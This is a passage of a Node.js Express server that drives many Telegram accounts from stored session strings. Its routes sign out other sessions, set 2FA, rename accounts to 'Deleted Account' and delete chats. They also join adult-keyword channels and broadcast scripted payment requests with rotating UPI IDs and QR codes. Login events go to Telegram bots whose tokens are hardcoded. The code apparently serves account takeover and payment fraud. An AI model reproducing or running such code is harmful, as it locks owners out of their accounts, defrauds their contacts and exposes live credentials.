require('./dbservice');\r\nconst { getClient, hasClient, disconnectAll, createClient, deleteClient, setActiveClientSetup, getActiveClientSetup } = require('./telegramManager');\r\nconst bodyParser = require('body-parser');\r\nconst swaggerUi = require('swagger-ui-express');\r\nconst swaggerSpec = require('./swaggerConfig');\r\nconst { sleep } = require('./utils');\r\nconst { fetchWithTimeout } = require('./utils');\r\nconst { execSync } = require('child_process');\r\nconst { CloudinaryService } = require('./cloudinary')\r\n\r\nprocess.on('unhandledRejection', (reason, promise) => {\r\n  console.error('Unhandled Rejection at:', promise, 'reason:', reason);\r\n});\r\nprocess.on('exit', async () => {\r\n  await ChannelService.getInstance().closeConnection();\r\n  await disconnectAll();\r\n});\r\n\r\nvar cors = require('cors');\r\nconst app = express();\r\nconst port = 8000;\r\nconst userMap = new Map();\r\n\r\nlet ip;\r\nlet clients;\r\nlet upiIds;\r\nconst pings = {}\r\n\r\nfetchWithTimeout('https://ipinfo.io/json')\r\n  .then(result => {\r\n    return result.data;\r\n  })\r\n  .then((output) => {\r\n    ip = output;\r\n    console.log(ip)\r\n  })\r\n  .then(() => {\r\n    ChannelService.getInstance().connect().then(async () => {\r\n      setTimeout(async () => {\r\n        checkerclass.getinstance()\r\n        await setUserMap();\r\n        setTimeout(() => {\r\n          // Array.from(userMap.values()).map(async (value) => {\r\n          //   try {\r\n          //     joinchannels(value);\r\n          //     await sleep(3000);\r\n          //   } catch (error) {\r\n          //     console.log(\"Some Error: \", error.code);\r\n          //   }\r\n          // })\r\n          joinchannelForBufferClients();\r\n        }, 120000);\r\n      }, 100);\r\n    })\r\n  }\r\n).catch(err => {\r\n  console.error(err)\r\n  joinchannelForBufferClients();\r\n})\r\n\r\nlet count = 0;\r\nlet botCount = 0\r\nconst ppplbot = () => {\r\n  let token;\r\n  if (botCount % 2 == 1) {\r\n    token = `bot6624618034:AAHoM3GYaw3_uRadOWYzT7c2OEp6a7A61mY`\r\n  } else {\r\n    token = `bot6607225097:AAG6DJg9Ll5XVxy24Nr449LTZgRb5bgshUA`\r\n  }\r\n\r\n  return `https://api.telegram.org/${token}/sendMessage?chat_id=-1001801844217`\r\n}\r\nconst pingerbot = `https://api.telegram.org/bot5807856562:${process.env.apikey}/sendMessage?chat_id=-1001703065531`;\r\n\r\nconst apiResp = {\r\n  INSTANCE_NOT_EXIST: \"INSTANCE_NOT_EXIST\",\r\n  CLIENT_NOT_EXIST: \"CLIENT_NOT_EXIST\",\r\n  CONNECTION_NOT_EXIST: \"CONNECTION_NOT_EXIST\",\r\n  ALL_GOOD: \"ALL_GOOD\",\r\n  DANGER: \"DANGER\",\r\n  WAIT: \"WAIT\"\r\n};\r\n\r\nasync function setUserMap() {\r\n  userMap.clear();\r\n  const db = ChannelService.getInstance();\r\n  await fetchWithTimeout(`${ppplbot()}&text=UptimeRobot : Refreshed Map`);\r\n  const users = await db.getAllUserClients();\r\n  clients = users\r\n  upiIds = await db.getAllUpis()\r\n  users.forEach(user => {\r\n    userMap.set(user.userName.toLowerCase(), { url: `${user.repl}/`, timeStamp: Date.now(), deployKey: user.deployKey, downTime: 0, lastPingTime: Date.now(), clientId: user.clientId })\r\n    pings[user.userName.toLowerCase()] = Date.now();\r\n  })\r\n}\r\n\r\nfunction getCurrentHourIST() {\r\n  const now = new Date();\r\n  const istOffset = 5.5 * 60 * 60 * 1000;\r\n  const istTime = new Date(now.getTime() + istOffset);\r\n  const istHour = istTime.getUTCHours();\r\n  return istHour;\r\n}\r\nconst connetionQueue = [];\r\ntry {\r\n  schedule.scheduleJob('test3', ' 25 2 * * * ', 'Asia/Kolkata', async () => {\r\n    checkBufferClients()\r\n    for (const value of userMap.values()) {\r\n      try {\r\n        const now = new Date();\r\n        if (now.getUTCDate() % 3 === 1) {\r\n          await fetchWithTimeout(`${value.url}leavechannels`);\r\n        }\r\n      } catch (error) {\r\n        console.log(\"Some Error: \", error.code);\r\n      }\r\n      await sleep(3000)\r\n    }\r\n    await fetchWithTimeout(`https://uptimechecker.onrender.com/joinchannel`)\r\n    await fetchWithTimeout(`https://mychatgpt-pg6w.onrender.com/deletefiles`);\r\n  })\r\n  schedule.scheduleJob('test3', ' 25 12 * * * ', 'Asia/Kolkata', async () => {\r\n    fetchWithTimeout(`https://uptimechecker.onrender.com/joinchannel`)\r\n    joinchannelForBufferClients();\r\n  })\r\n} catch (error) {\r\n  console.log(\"Some Error: \", error.code);\r\n}\r\n\r\n\r\napp.use(cors());\r\napp.use(bodyParser.json());\r\napp.use('/api-docs', swaggerUi.serve, swaggerUi.setup(swaggerSpec));\r\napp.get('/', async (req, res, next) => {\r\n  checkerclass.getinstance()\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n\r\n  //\r\n});\r\n\r\napp.get('/exitacc', async (req, res, next) => {\r\n  checkerclass.getinstance()\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  //\r\n});\r\n\r\napp.get('/checkBufferClients', async (req, res, next) => {\r\n  checkerclass.getinstance()\r\n  res.send('Checking Buffer Clients');\r\n  next();\r\n}, async (req, res) => {\r\n  await checkBufferClients();\r\n});\r\n\r\napp.get('/processUsers/:limit/:skip', async (req, res, next) => {\r\n  res.send(\"ok\")\r\n  next();\r\n}, async (req, res) => {\r\n  const limit = req.params.limit ? req.params.limit : 30\r\n  const skip = req.params.skip ? req.params.skip : 20\r\n  const db = await ChannelService.getInstance();\r\n  const cursor = await db.processUsers(parseInt(limit), parseInt(skip));\r\n  while (await cursor.hasNext()) {\r\n    const document = await cursor.next();\r\n    const cli = await createClient(document.mobile, document.session);\r\n    const client = await getClient(document.mobile);\r\n    if (cli) {\r\n      console.log(document.mobile, \" :  true\");\r\n      const lastActive = await client.getLastActiveTime();\r\n      const date = new Date(lastActive * 1000).toISOString().split('T')[0];\r\n      const me = await client.getMe()\r\n      await db.updateUser(document, { msgs: cli.msgs, totalChats: cli.total, lastActive, date, tgId: me.id.toString(), lastUpdated: new Date().toISOString().split('T')[0] });\r\n      await client?.disconnect(document.mobile);\r\n      await deleteClient()\r\n    } else {\r\n      console.log(document.mobile, \" :  false\");\r\n      await db.deleteUser(document);\r\n    }\r\n  }\r\n  console.log(\"finished\")\r\n});\r\n\r\napp.get('/refreshMap', async (req, res) => {\r\n  checkerclass.getinstance();\r\n  await setUserMap();\r\n  res.send('Hello World!');\r\n});\r\n\r\napp.get('/clearstats2', async (req, res) => {\r\n  checkerclass.getinstance();\r\n  const db = ChannelService.getInstance();\r\n  await db.clearStats2();\r\n  res.send('Hello World!');\r\n});\r\n\r\napp.get('/exit', async (req, res) => {\r\n  await ChannelService.getInstance().closeConnection();\r\n  process.exit(1)\r\n  res.send('Hello World!');\r\n});\r\n\r\napp.post('/channels', async (req, res, next) => {\r\n  res.send('Hello World!');\r\n  // console.log(req.body);\r\n  next();\r\n}, async (req, res) => {\r\n  const channels = req.body?.channels;\r\n  const db = ChannelService.getInstance();\r\n  channels?.forEach(async (channel) => {\r\n    await db.insertChannel(channel);\r\n  })\r\n});\r\n\r\nlet settingupClient = Date.now() - 250000;\r\napp.get('/setupClient/:clientId', async (req, res, next) => {\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  if (Date.now() > (settingupClient + 240000)) {\r\n    await disconnectAll();\r\n    await sleep(1000)\r\n    settingupClient = Date.now();\r\n    const clientId = req.params?.clientId;\r\n    const archieveOld = req?.query?.a;\r\n    const days = req?.query?.d;\r\n    const mobile = req?.query?.m;\r\n    const formalities = req?.query?.f;\r\n    const PLimited = !!req.query.PLimited;\r\n    console.log(clientId, archieveOld);\r\n    await fetchWithTimeout(`${ppplbot()}&text=Received NEw Client Request for - ${clientId}`);\r\n    await setUpClient(clientId.toString(), archieveOld?.toLowerCase() === 'yes' ? true : false, days, mobile, formalities?.toLowerCase() === 'no' ? false : true, PLimited)\r\n  } else {\r\n    console.log(\"Profile Setup Recently tried\");\r\n  }\r\n})\r\n\r\napp.get('/updateClient/:clientId', async (req, res, next) => {\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  settingupClient = Date.now();\r\n  const clientId = req.params?.clientId;\r\n  console.log(clientId);\r\n  await updateClient(clientId.toString())\r\n})\r\n\r\napp.get('/getip', (req, res) => {\r\n  res.json(ip);\r\n});\r\n\r\napp.post('/users', async (req, res, next) => {\r\n  res.send('Hello World!');\r\n  console.log(req.body);\r\n  next();\r\n}, async (req, res) => {\r\n  const user = req.body;\r\n  const db = ChannelService.getInstance();\r\n  const cli = getClient(user.mobile);\r\n  const activeClientSetup = getActiveClientSetup()\r\n  if (!cli || activeClientSetup?.phoneNumber !== user.mobile) {\r\n    user['lastUpdated'] = new Date().toISOString().split('T')[0]\r\n    await db.insertUser(user);\r\n    await fetchWithTimeout(`${ppplbot()}&text=ACCOUNT LOGIN: ${user.userName ? user.userName : user.firstName}:${user.msgs}:${user.totalChats}\\n https://uptimechecker.onrender.com/connectclient/${user.mobile}`)\r\n  } else {\r\n    setActiveClientSetup(undefined)\r\n    console.log(\"New Session Generated\");\r\n    await setNewClient(user, activeClientSetup);\r\n    await deleteClient(user.mobile)\r\n  }\r\n});\r\n\r\napp.get('/channels/:limit/:skip', async (req, res, next) => {\r\n  const limit = req.params.limit ? req.params.limit : 30\r\n  const skip = req.params.skip ? req.params.skip : 20\r\n  const k = req.query?.k\r\n  const db = ChannelService.getInstance();\r\n  const channels = await db.getChannels(parseInt(limit), parseInt(skip), k);\r\n  let resp = 'joinchannel:'\r\n  for (const channel of channels) {\r\n    resp = resp + (channel?.username?.startsWith(\"@\") ? channel.username : `@${channel.username}`) + \"|\";\r\n  }\r\n  res.send(resp);\r\n});\r\n\r\napp.get('/activechannels/:limit/:skip', async (req, res, next) => {\r\n  const limit = req.params.limit ? req.params.limit : 30\r\n  const skip = req.params.skip ? req.params.skip : 20\r\n  const k = req.query?.k\r\n  const db = ChannelService.getInstance();\r\n  const result = await db.getActiveChannels(parseInt(limit), parseInt(skip), [k], [], 'channels');\r\n  let resp = 'joinchannel:'\r\n  for (const channel of result) {\r\n\r\n    resp = resp + (channel?.username?.startsWith(\"@\") ? channel.username : `@${channel.username}`) + \"|\";\r\n  }\r\n  res.send(resp);\r\n});\r\n\r\nlet refresTime = Date.now();\r\napp.get('/getdata', async (req, res, next) => {\r\n  checkerclass.getinstance()\r\n  if (Date.now() > refresTime) {\r\n    refresTime = Date.now() + (5 * 60 * 1000);\r\n    Array.from(userMap.values()).map(async (value) => {\r\n      await fetchWithTimeout(`${value.url}markasread`);\r\n    })\r\n  }\r\n  res.setHeader('Content-Type', 'text/html');\r\n  let resp = '<html><head></head><body>';\r\n  resp = resp + await getData();\r\n  resp += '</body></html>';\r\n  resp += `<script>\r\n              console.log(\"hii\");\r\n              setInterval(() => {\r\n                window.location.reload();\r\n              }, 20000);\r\n          </script>`;\r\n  res.send(resp);\r\n});\r\n\r\napp.get('/getdata2', async (req, res, next) => {\r\n  checkerclass.getinstance()\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  const userValues = Array.from(userMap.values());\r\n  for (let i = 0; i < userValues.length; i++) {\r\n    const value = userValues[i];\r\n    await fetchWithTimeout(`${value.url}getDemostat2`);\r\n    await sleep(1000);\r\n  }\r\n});\r\n\r\napp.get('/getAllIps', async (req, res, next) => {\r\n  checkerclass.getinstance()\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  const userValues = Array.from(userMap.values());\r\n  for (let i = 0; i < userValues.length; i++) {\r\n    const value = userValues[i];\r\n    try {\r\n      console.log(value.clientId)\r\n      const res = await fetchWithTimeout(`${value.url}getip`);\r\n      console.log(res.data);\r\n    } catch (error) {\r\n\r\n    }\r\n  }\r\n});\r\n\r\napp.get('/refreshupis', async (req, res, next) => {\r\n  checkerclass.getinstance()\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  const userValues = Array.from(userMap.values());\r\n  for (let i = 0; i < userValues.length; i++) {\r\n    const value = userValues[i];\r\n    await fetchWithTimeout(`${value.url}refreshupis`);\r\n  }\r\n});\r\n\r\napp.get('/getuserdata', async (req, res, next) => {\r\n  checkerclass.getinstance()\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  const userValues = Array.from(userMap.values());\r\n  for (let i = 0; i < userValues.length; i++) {\r\n    const value = userValues[i];\r\n    await fetchWithTimeout(`${value.url}getuserstats`);\r\n    await sleep(1000);\r\n  }\r\n});\r\n\r\napp.get('/getuserdata2', async (req, res, next) => {\r\n  checkerclass.getinstance()\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  const userValues = Array.from(userMap.values());\r\n  for (let i = 0; i < userValues.length; i++) {\r\n    const value = userValues[i];\r\n    await fetchWithTimeout(`${value.url}getuserstats2`);\r\n    await sleep(1000);\r\n  }\r\n});\r\n\r\napp.get('/restartall', async (req, res, next) => {\r\n  checkerclass.getinstance()\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  Array.from(userMap.values()).map(async (value) => {\r\n    await fetchWithTimeout(`${value.deployKey}`);\r\n  })\r\n});\r\napp.get('/sendtoall', async (req, res, next) => {\r\n  checkerclass.getinstance();\r\n  console.log('Received sendtoall request');\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  const queries = req.query\r\n  let newQuery = '';\r\n  Object.keys(req.query).map((key) => {\r\n    newQuery += `${queries[key]}/`\r\n  });\r\n  console.log(newQuery);\r\n  for (const value of userMap.values()) {\r\n    const url = `${value.url}${newQuery}`;\r\n    console.log(url);\r\n    await sleep(1000);\r\n    await fetchWithTimeout(url);\r\n  }\r\n});\r\n\r\napp.get('/usermap', async (req, res) => {\r\n  checkerclass.getinstance()\r\n  console.log('Received Usermap request');\r\n  res.json(Array.from(userMap.values()));\r\n});\r\n\r\napp.get('/getbufferclients', async (req, res) => {\r\n  const db = ChannelService.getInstance();\r\n  const result = []\r\n  const clients = await db.readBufferClients({});\r\n  clients.forEach((cli) => {\r\n    result.push(cli.mobile);\r\n  })\r\n  res.json(result);\r\n});\r\n\r\napp.get('/clients', async (req, res) => {\r\n  checkerclass.getinstance();\r\n  console.log('Received Client request');\r\n  res.json(clients)\r\n});\r\n\r\napp.get('/keepready2', async (req, res, next) => {\r\n  checkerclass.getinstance()\r\n  console.log('Received keepready2 request');\r\n  res.send(`Responding!!\\nMsg = ${req.query.msg}`);\r\n  next();\r\n}, async (req, res) => {\r\n  const msg = req.query.msg;\r\n  console.log(\"Msg2 = \", msg);\r\n  Array.from(userMap.values()).map(async (value) => {\r\n    await fetchWithTimeout(`${value.url}resptopaid2?msg=${msg ? msg : \"Oye...\"}`);\r\n    await fetchWithTimeout(`${value.url}getDemostats`);\r\n  });\r\n  const db = ChannelService.getInstance();\r\n  await db.clearStats()\r\n});\r\n\r\napp.get('/keepready', async (req, res, next) => {\r\n  checkerclass.getinstance();\r\n  console.log('Received Keepready request');\r\n  const dnsMsg = encodeURIComponent(`Dont Speak Okay!!\\n**I am in Bathroom**\\n\\nMute yourself!!\\n\\nI will show you Okay..!!`)\r\n  const msg = req.query.msg.toLowerCase() == 'dns' ? dnsMsg : req.query.msg;\r\n  Array.from(userMap.values()).map(async (value) => {\r\n    await fetchWithTimeout(`${value.url}resptopaid?msg=${msg ? msg : \"Oye...\"}`);\r\n  });\r\n  const db = ChannelService.getInstance();\r\n  await db.clearStats();\r\n  res.send(`Responding!!\\nMsg = ${msg}`);\r\n});\r\n\r\napp.get('/asktopay', async (req, res, next) => {\r\n  checkerclass.getinstance();\r\n  console.log('Received AsktoPay request');\r\n  res.send(`Asking Pppl`);\r\n  next();\r\n}, async (req, res) => {\r\n  const msg = req.query.msg;\r\n  console.log(\"Msg = \", msg);\r\n  Array.from(userMap.values()).map(async (value) => {\r\n    await fetchWithTimeout(`${value.url}asktopay`)\r\n  })\r\n});\r\n\r\nlet callingTime = Date.now();\r\napp.get('/calltopaid', async (req, res, next) => {\r\n  checkerclass.getinstance()\r\n  console.log('Received Call request');\r\n  res.send(`Asking Pppl`);\r\n  next();\r\n}, async (req, res) => {\r\n  const msg = req.query.msg;\r\n  console.log(\"Msg = \", msg);\r\n  if (Date.now() > callingTime) {\r\n    callingTime = Date.now() + (10 * 60 * 1000)\r\n    Array.from(userMap.values()).map(async (value) => {\r\n      await fetchWithTimeout(`${value.url}calltopaid`)\r\n    })\r\n  }\r\n});\r\n\r\n\r\napp.get('/markasread', async (req, res, next) => {\r\n  checkerclass.getinstance();\r\n  console.log('Received MarkasRead Req');\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  const all = req.query.all;\r\n  if (Date.now() > refresTime) {\r\n    refresTime = Date.now() + (5 * 60 * 1000);\r\n    console.log(\"proceeding with all = \", all);\r\n    Array.from(userMap.values()).map(async (value) => {\r\n      await fetchWithTimeout(`${value.url}markasread?${all ? \"all=true\" : ''}`);\r\n    })\r\n  }\r\n});\r\n\r\napp.get('/setactiveqr', async (req, res, next) => {\r\n  checkerclass.getinstance()\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  const upi = req.query.upi;\r\n  console.log(\"upi = \", upi);\r\n  Array.from(userMap.values()).map(async (value) => {\r\n    await fetchWithTimeout(`${value.url}setactiveqr?upi=${upi}`);\r\n  })\r\n});\r\n\r\napp.get('/getUpiId', async (req, res) => {\r\n  checkerclass.getinstance();\r\n  const app = req.query.app ? req.query.app : \"paytm3\"\r\n  const db = ChannelService.getInstance();\r\n  const upiId = await db.getupi(app);\r\n  res.send(upiId);\r\n});\r\n\r\napp.get('/getAllUpiIds', async (req, res) => {\r\n  checkerclass.getinstance();\r\n  res.json(upiIds);\r\n});\r\n\r\napp.post('/getAllUpiIds', async (req, res, next) => {\r\n  const data = req.body\r\n  checkerclass.getinstance();\r\n  const db = ChannelService.getInstance();\r\n  const upiIds = await db.updateUpis(data);\r\n  res.json(upiIds);\r\n  next();\r\n}, async () => {\r\n  const userValues = Array.from(userMap.values());\r\n  for (let i = 0; i < userValues.length; i++) {\r\n    const value = userValues[i];\r\n    await fetchWithTimeout(`${value.url}refreshupis`);\r\n  }\r\n})\r\n\r\napp.get('/getUserConfig', async (req, res) => {\r\n  const filter = req.query\r\n  checkerclass.getinstance();\r\n  const db = ChannelService.getInstance();\r\n  const userConfig = await db.getUserConfig(filter);\r\n  res.json(userConfig);\r\n});\r\n\r\napp.post('/getUserConfig', async (req, res) => {\r\n  const filter = req.query\r\n  const data = req.body\r\n  checkerclass.getinstance();\r\n  const db = ChannelService.getInstance();\r\n  const upiIds = await db.updateUserConfig(filter, data);\r\n  await setUserMap();\r\n  res.json(upiIds);\r\n});\r\n\r\n\r\napp.get('/builds', async (req, res) => {\r\n  checkerclass.getinstance();\r\n  const db = ChannelService.getInstance();\r\n  const data = await db.getBuilds();\r\n  console.log(data);\r\n  res.json(data);\r\n});\r\n\r\napp.post('/builds', async (req, res) => {\r\n  const data = req.body\r\n  checkerclass.getinstance();\r\n  const db = ChannelService.getInstance();\r\n  console.log(data);\r\n  const result = await db.updateBuilds(data);\r\n  res.json(result);\r\n});\r\n\r\napp.get('/getAllUserClients', async (req, res) => {\r\n  checkerclass.getinstance();\r\n  const db = ChannelService.getInstance();\r\n  const userConfig = await db.getAllUserClients();\r\n  const resp = []\r\n  userConfig.map((user) => {\r\n    resp.push(user.clientId)\r\n  })\r\n  res.send(resp);\r\n});\r\n\r\napp.get('/getTgConfig', async (req, res) => {\r\n  checkerclass.getinstance();\r\n  const db = ChannelService.getInstance();\r\n  const tgConfig = await db.getTgConfig()\r\n  res.json(tgConfig);\r\n});\r\n\r\napp.get('/updateActiveChannels', async (req, res) => {\r\n  checkerclass.getinstance();\r\n  const db = ChannelService.getInstance();\r\n  const tgConfig = await db.updateActiveChannels();\r\n  res.send(\"ok\");\r\n});\r\n\r\napp.get('/getCurrentActiveUniqueChannels', async (req, res) => {\r\n  checkerclass.getinstance();\r\n  const db = ChannelService.getInstance();\r\n  const result = await db.getCurrentActiveUniqueChannels();\r\n  res.json({ length: result.length, data: result });\r\n});\r\n\r\napp.post('/getTgConfig', async (req, res, next) => {\r\n  const data = req.body\r\n  checkerclass.getinstance();\r\n  const db = ChannelService.getInstance();\r\n  const upiIds = await db.updateUpis(data)\r\n  res.json(upiIds);\r\n  next();\r\n}, async () => {\r\n  const userValues = Array.from(userMap.values());\r\n  for (let i = 0; i < userValues.length; i++) {\r\n    const value = userValues[i];\r\n    await fetchWithTimeout(`${value.url}refreshupis`);\r\n  }\r\n});\r\n\r\napp.get('/lastpings', async (req, res, next) => {\r\n  checkerclass.getinstance();\r\n  let resp = '<html><head><style>pre { font-size: 18px; }</style></head><body><pre>';\r\n  const userValues = Array.from(userMap.values());\r\n  for (let i = 0; i < userValues.length; i++) {\r\n    const value = userValues[i];\r\n    resp = resp + `${value.clientId}  :  ${Number(((Date.now() - value.lastPingTime) / 60000).toFixed(2))}\\n`\r\n  }\r\n  resp += '</pre></body></html>';\r\n  res.setHeader('Content-Type', 'text/html');\r\n  res.send(resp);\r\n});\r\n\r\napp.get('/lastpingsjson', async (req, res, next) => {\r\n  checkerclass.getinstance();\r\n  let resp = '<html><head><style>pre { font-size: 18px; }</style></head><body><pre>';\r\n  for (const userdata in pings) {\r\n    resp = resp + `${userdata}  :  ${Number(((Date.now() - pings[userdata]) / 60000).toFixed(2))}\\n`\r\n  }\r\n  resp += '</pre></body></html>';\r\n  res.setHeader('Content-Type', 'text/html');\r\n  res.send(resp);\r\n});\r\n\r\napp.get('/exitglitches', async (req, res, next) => {\r\n  res.send(\"ok\")\r\n  next();\r\n}, async () => {\r\n  const userValues = Array.from(userMap.values());\r\n  for (let i = 0; i < userValues.length; i++) {\r\n    const value = userValues[i];\r\n    if (value.url.toLowerCase().includes('glitch'))\r\n      await fetchWithTimeout(`${value.url}exit`);\r\n  }\r\n});\r\n\r\napp.get('/exitprimary', async (req, res, next) => {\r\n  res.send(\"ok\")\r\n  next();\r\n}, async () => {\r\n  const userValues = Array.from(userMap.values());\r\n  for (let i = 0; i < userValues.length; i++) {\r\n    const value = userValues[i];\r\n    if (value.clientId.toLowerCase().includes('1'))\r\n      await fetchWithTimeout(`${value.url}exit`);\r\n  }\r\n});\r\n\r\napp.get('/exitsecondary', async (req, res, next) => {\r\n  res.send(\"ok\")\r\n  next();\r\n}, async () => {\r\n  const userValues = Array.from(userMap.values());\r\n  for (let i = 0; i < userValues.length; i++) {\r\n    const value = userValues[i];\r\n    if (value.clientId.toLowerCase().includes('2'))\r\n      await fetchWithTimeout(`${value.url}exit`);\r\n  }\r\n});\r\n\r\napp.get('/connectclient/:number', async (req, res) => {\r\n  const number = req.params?.number;\r\n  const db = ChannelService.getInstance();\r\n  const user = await db.getUser({ mobile: number });\r\n  if (user) {\r\n    if (!hasClient(user.mobile)) {\r\n      const cli = await createClient(user.mobile, user.session);\r\n      if (cli) {\r\n        res.send(\"client created\");\r\n      } else {\r\n        res.send(\"client EXPIRED\");\r\n      }\r\n    } else {\r\n      res.send(\"Client Already existing\");\r\n    }\r\n  } else {\r\n    res.send(\"User Does not exist\");\r\n  }\r\n});\r\n\r\napp.get('/joinchannels/:number/:limit/:skip', async (req, res, next) => {\r\n  res.send(\"joiningChannels\");\r\n  next();\r\n}, async (req, res) => {\r\n  try {\r\n    const number = req.params?.number;\r\n    const limit = req.params.limit ? req.params.limit : 30\r\n    const skip = req.params.skip ? req.params.skip : 20\r\n    const k = req.query?.k\r\n    const db = ChannelService.getInstance();\r\n    const user = await db.getUser({ mobile: number });\r\n    if (!hasClient(user.mobile)) {\r\n      const cli = await createClient(user.mobile, user.session, false);\r\n      if (cli) {\r\n        const client = await getClient(user.mobile);\r\n        const channels = await client.channelInfo(true);\r\n        const keys = ['wife', 'adult', 'lanj', 'lesb', 'paid', 'randi', 'bhab', 'boy', 'girl'];\r\n        const result = await db.getActiveChannels(parseInt(limit), parseInt(skip), k ? [k] : keys, channels.ids, 'channels');\r\n        console.log(\"DbChannelsLen: \", result.length);\r\n        let resp = '';\r\n        for (const channel of result) {\r\n\r\n          resp = resp + (channel?.username?.startsWith(\"@\") ? channel.username : `@${channel.username}`) + \"|\";\r\n        }\r\n        await client.removeOtherAuths();\r\n        client.joinChannels(resp);\r\n      } else {\r\n        console.log(\"Client Does not exist!\")\r\n      }\r\n    }\r\n  } catch (error) {\r\n    console.log(\"Some Error: \", error)\r\n  }\r\n});\r\n\r\napp.get('/set2fa/:number', async (req, res, next) => {\r\n  res.send(\"Setting 2FA\");\r\n  next();\r\n}, async (req, res) => {\r\n  try {\r\n    const number = req.params?.number;\r\n    const db = ChannelService.getInstance();\r\n    const user = await db.getUser({ mobile: number });\r\n    if (!hasClient(user.mobile)) {\r\n      const cli = await createClient(user.mobile, user.session);\r\n      const client = await getClient(user.mobile);\r\n      if (cli) {\r\n        await client.set2fa();\r\n      } else {\r\n        console.log(\"Client Does not exist!\")\r\n      }\r\n    }\r\n  } catch (error) {\r\n    console.log(\"Some Error: \", error.code)\r\n  }\r\n});\r\n\r\napp.get('/setpp/:number/:name', async (req, res, next) => {\r\n  res.send(\"Setting 2FA\");\r\n  next();\r\n}, async (req, res) => {\r\n  try {\r\n    const number = req.params?.number;\r\n    const name = req.params?.name;\r\n    const db = ChannelService.getInstance();\r\n    const user = await db.getUser({ mobile: number });\r\n    if (!hasClient(user.mobile)) {\r\n      const cli = await createClient(user.mobile, user.session);\r\n      const client = await getClient(user.mobile);\r\n      if (cli) {\r\n        await CloudinaryService.getInstance(name);\r\n        await sleep(2000);\r\n        await client.updateProfilePic('./dp1.jpg');\r\n        await sleep(1000);\r\n        await client.updateProfilePic('./dp2.jpg');\r\n        await sleep(1000);\r\n        await client.updateProfilePic('./dp3.jpg');\r\n        await sleep(1000);\r\n      } else {\r\n        console.log(\"Client Does not exist!\")\r\n      }\r\n    }\r\n  } catch (error) {\r\n    console.log(\"Some Error: \", error.code)\r\n  }\r\n});\r\n\r\n\r\napp.get('/updateclientasdeleted/:number', async (req, res, next) => {\r\n  res.send(\"Updating Name\");\r\n  next();\r\n}, async (req, res) => {\r\n  try {\r\n    const number = req.params?.number;\r\n    const db = ChannelService.getInstance();\r\n    let user = await db.getUser({ mobile: number });\r\n    if (!user) {\r\n      user = await db.getInAchivedClient({ number: `+${number}` });\r\n      user['mobile'] = user.number\r\n    }\r\n    console.log(user);\r\n    if (user && !hasClient(user.mobile)) {\r\n      const cli = await createClient(user.mobile, user.session);\r\n      const client = await getClient(user.mobile);\r\n      if (cli) {\r\n        if (!(await client.hasPassword())) {\r\n          await client.set2fa();\r\n        }\r\n        await sleep(30000)\r\n        await client.updateUsername();\r\n        await sleep(5000)\r\n        await client.updatePrivacyforDeletedAccount();\r\n        await sleep(5000)\r\n        await client.updateProfile(\"Deleted Account\", \"Deleted Account\");\r\n        await sleep(5000)\r\n        await client.deleteProfilePhotos();\r\n        await sleep(5000)\r\n      } else {\r\n        console.log(\"Client Does not exist!\")\r\n      }\r\n    }\r\n  } catch (error) {\r\n    console.log(\"Some Error: \", error)\r\n  }\r\n});\r\n\r\n\r\napp.get('/updatePrivacy/:number', async (req, res, next) => {\r\n  res.send(\"Updating Privacy\");\r\n  next();\r\n}, async (req, res) => {\r\n  try {\r\n    const number = req.params?.number;\r\n    const db = ChannelService.getInstance();\r\n    const user = await db.getUser({ mobile: number });\r\n    console.log(user);\r\n    if (!hasClient(user.mobile)) {\r\n      const cli = await createClient(user.mobile, user.session);\r\n      const client = await getClient(user.mobile);\r\n      if (cli) {\r\n        await client.updatePrivacy();\r\n      } else {\r\n        console.log(\"Client Does not exist!\")\r\n      }\r\n    }\r\n  } catch (error) {\r\n    console.log(\"Some Error: \", error)\r\n  }\r\n});\r\n\r\napp.get('/UpdateUsername/:number', async (req, res, next) => {\r\n  res.send(\"Updating Privacy\");\r\n  next();\r\n}, async (req, res) => {\r\n  try {\r\n    const number = req.params?.number;\r\n    const username = req.query?.username;\r\n    const db = ChannelService.getInstance();\r\n    const user = await db.getUser({ mobile: number });\r\n    console.log(user);\r\n    if (!hasClient(user.mobile)) {\r\n      const cli = await createClient(user.mobile, user.session);\r\n      const client = await getClient(user.mobile);\r\n      if (cli) {\r\n        await client.updateUsername(username);\r\n      } else {\r\n        console.log(\"Client Does not exist!\")\r\n      }\r\n    }\r\n  } catch (error) {\r\n    console.log(\"Some Error: \", error)\r\n  }\r\n});\r\n\r\n\r\napp.get('/UpdatePP/:number', async (req, res, next) => {\r\n  res.send(\"Updating profile Pic\");\r\n  next();\r\n}, async (req, res) => {\r\n  try {\r\n    const number = req.params?.number;\r\n    const db = ChannelService.getInstance();\r\n    const user = await db.getUser({ mobile: number });\r\n    console.log(user);\r\n    if (!hasClient(user.mobile)) {\r\n      const cli = await createClient(user.mobile, user.session);\r\n      const client = await getClient(user.mobile);\r\n      if (cli) {\r\n        await client.updateProfilePic(\"./qrcode.jpg\");\r\n      } else {\r\n        console.log(\"Client Does not exist!\")\r\n      }\r\n    }\r\n  } catch (error) {\r\n    console.log(\"Some Error: \", error)\r\n  }\r\n});\r\n\r\napp.get('/deleteChat/:number/:chatId', async (req, res, next) => {\r\n  res.send(\"dleteing chat\");\r\n  next();\r\n}, async (req, res) => {\r\n  try {\r\n    const number = req.params?.number;\r\n    const chatId = req.params?.chatId;\r\n    const db = ChannelService.getInstance();\r\n    const user = await db.getUser({ mobile: number });\r\n    console.log(user);\r\n    if (!hasClient(user.mobile)) {\r\n      const cli = await createClient(user.mobile, user.session);\r\n      const client = await getClient(user.mobile);\r\n      if (cli) {\r\n        await client.deleteChat(chatId);\r\n      } else {\r\n        console.log(\"Client Does not 